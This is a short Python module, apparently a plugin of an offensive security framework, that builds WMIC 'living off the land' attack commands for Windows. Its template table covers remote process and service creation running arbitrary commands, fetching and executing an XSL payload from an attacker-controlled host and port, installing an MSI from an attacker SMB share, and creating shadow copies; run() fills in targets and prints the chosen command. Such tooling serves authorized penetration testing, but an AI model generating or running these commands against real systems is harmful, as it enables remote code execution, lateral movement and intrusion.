"""WMIC LOLBin — remote/local execution, XSL script processing."""
from __future__ import annotations
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lolbins.wmic.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["code_execution", "remote_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1047"],
}

TECHNIQUES = {
    "process_create": 'wmic /node:"{target}" process call create "cmd /c {cmd}"',
    "xsl_exec": 'wmic os get /format:"http://{lhost}:{lport}/payload.xsl"',
    "product_install": 'wmic /node:"{target}" product call install PackageLocation="\\\\{lhost}\\share\\payload.msi"',
    "shadowcopy": 'wmic shadowcopy call create Volume="C:\\"',
    "service_create": 'wmic /node:"{target}" service call create name="{svc}" PathName="cmd /c {cmd}"',
}


def run(args: Any) -> int:
    technique = getattr(args, "wmic_tech", "process_create")
    cmd = TECHNIQUES.get(technique, TECHNIQUES["process_create"])
    cmd = cmd.format(
        target=getattr(args, "target", "<TARGET>"),
        cmd=getattr(args, "command", "whoami"),
        lhost=getattr(args, "lhost", "<LHOST>"),
        lport=getattr(args, "lport", "8080"),
        svc=getattr(args, "service_name", "EvilSvc"),
    )

    print("[*] WMIC LOLBin ({}):".format(technique))
    print("  {}".format(cmd))
    print("\n[*] Available techniques: {}".format(", ".join(TECHNIQUES.keys())))
    return 0
